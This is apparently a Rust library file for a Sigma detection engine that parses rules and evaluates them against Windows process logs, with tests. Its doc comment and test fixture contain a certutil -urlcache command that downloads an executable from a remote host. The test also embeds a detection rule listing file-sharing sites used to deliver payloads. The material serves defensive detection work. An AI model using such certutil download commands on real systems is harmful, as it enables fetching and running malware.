use std::collections::HashMap;
use serde_json::Value;
use crate::ast::parse_expr;
use crate::evaluate::{evaluate_condition_expr, parse_identifier, Rule, Sigma};

pub(crate) mod evaluate;
pub(crate) mod ast;



/// parse a sigma yaml to sigma rule which can use to evaluate for a log map
/// you can use rule for any log input
pub fn parse_sigma(sigma_yaml:String) -> Rule{
    let mut rule = Rule::default();
    if let Ok(sigma) = serde_yaml::from_str::<Sigma>(&sigma_yaml){
        rule.header = sigma.header;
        if let Some(detection) = sigma.detection{
            if let Some(serde_yaml::Value::String(condition)) = detection.condition{
                if let Ok((remain,condition_expr)) = parse_expr(condition.as_str()){
                    if remain.trim().is_empty() {
                        rule.condition = Some(condition_expr);
                    }
                }
            }
            if let Ok(ident_map) = parse_identifier(detection.identifiers) {
                rule.ident_map = ident_map;
            }
        }
    }
    rule
}


/// evaluate log map for a sigma rule,source_map like<br>
/// {<br>
/// "Image": "C:\\Windows\\system32\\certutil.exe",<br>
/// "ParentImage": "C:\\WINDOWS\\system32\\cmd.exe",<br>
/// "ProcessId": "10952",<br>
/// "utc_time": "2023-03-20 17:31:23",<br>
/// "ServerScore": "0",<br>
/// "CommandLine": "certutil  \"-urlcache\" \"-split\" \"-f\" \"http://ip/artifact.exe test.exe\"",<br>
/// "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",<br>
/// "OriginalFile": "CertUtil.exe.mui",<br>
/// "log_type": "ProcessCreate"<br>
/// }

pub fn evaluate_sigma(rule:Rule,source_map: &HashMap<String,Value>) -> bool{
    let mut ident_result_map = HashMap::new();
    for (ident,field_matchers) in rule.ident_map{
        let mut if_match = false;
        for matcher in field_matchers{
            if matcher.evaluate_field_matcher(source_map){
                if_match = true;
                break;
            }
        }
        ident_result_map.insert(ident.clone(),if_match);
    }
    if let Some(condition) = rule.condition{
        return evaluate_condition_expr(Box::new(condition),&ident_result_map);
    } else {
        //default all ident is true,then true
        return ident_result_map.iter().all(|x|*x.1 == true);
    }
}

/// evaluate log map for json log
pub fn evaluate_sigma_for_json(rule:Rule,source_map_json: &str) -> bool{
    if let Ok(source_map) = serde_json::from_str::<HashMap<String,Value>>(source_map_json) {
        let mut ident_result_map = HashMap::new();
        for (ident, field_matchers) in rule.ident_map {
            let mut if_match = false;
            for matcher in field_matchers {
                if matcher.evaluate_field_matcher(&source_map) {
                    if_match = true;
                    break;
                }
            }
            ident_result_map.insert(ident.clone(), if_match);
        }
        if let Some(condition) = rule.condition {
            return evaluate_condition_expr(Box::new(condition), &ident_result_map);
        } else {
            //default all ident is true,then true
            return ident_result_map.iter().all(|x| *x.1 == true);
        }
    }
    false
}

#[cfg(test)]
mod test {
    use std::collections::HashMap;
    
    use crate::ast::parse_expr;
    use crate::evaluate::{evaluate_condition_expr};
    use crate::{evaluate_sigma_for_json, parse_sigma};

    #[test]
    pub fn test_parse_one_of() {
        let (remain, expr) = parse_expr("(not test1) and ((1 of test*) and (all of x?))").unwrap();
        println!("{:?}", expr);
        if remain.trim() == "" {
            let mut result_map: HashMap<String, bool> = HashMap::new();
            result_map.insert("test1".to_string(), false);
            result_map.insert("test2".to_string(), true);
            result_map.insert("x3".to_string(), true);
            result_map.insert("x4".to_string(), true);
            result_map.insert("x5".to_string(), false);
            println!("{:?}", evaluate_condition_expr(Box::new(expr), &result_map));
        }
    }



    #[test]
    pub fn test_evaluate() {
        let rule = r#"title: Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE
id: 42a5f1e7-9603-4f6d-97ae-3f37d130d794
related:
    - id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b # Direct IP download
      type: similar
    - id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829 # Generic download
      type: similar
status: experimental
description: Detects the execution of certutil with certain flags that allow the utility to download files from file-sharing websites.
references:
    - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
    - https://forensicitguy.github.io/agenttesla-vba-certutil-download/
    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/
    - https://twitter.com/egre55/status/1087685529016193025
    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2023/02/15
tags:
    - attack.defense_evasion
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_flags:
        CommandLine|contains:
            - 'urlcache '
            - 'verifyctl '
    selection_http:
        CommandLine|contains:
            - '.ghostbin.co/'
            - '.hastebin.com'
            - '.paste.ee'
            - 'anonfiles.com'
            - 'cdn.discordapp.com/attachments/'
            - 'ddns.net'
            - 'gist.githubusercontent.com'
            - 'mediafire.com'
            - 'mega.nz'
            - 'paste.ee'
            - 'pastebin.com'
            - 'pastebin.pl'
            - 'pastetext.net'
            - 'privatlab.com'
            - 'privatlab.net'
            - 'raw.githubusercontent.com'
            - 'send.exploit.in'
            - 'sendspace.com'
            - 'storage.googleapis.com'
            - 'transfer.sh'
            - 'ufile.io'
    condition: all of selection_*
falsepositives:
    - Unknown
level: high"#;
        let json = r#"{
    "Image": "C:\\Windows\\system32\\certutil.exe",
    "ParentImage": "C:\\WINDOWS\\system32\\cmd.exe",
    "ProcessId": "10952",
    "utc_time": "2023-03-20 17:31:23",
    "ServerScore": "0",
    "CommandLine": "certutil  -urlcache \"-split\" \"-f\" \"http://transfer.sh/artifact.exe test.exe\"",
    "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
    "OriginalFile": "CertUtil.exe.mui",
    "log_type": "ProcessCreate"
  }"#;
        println!("{}", evaluate_sigma_for_json(parse_sigma(rule.to_string()), json));
    }
}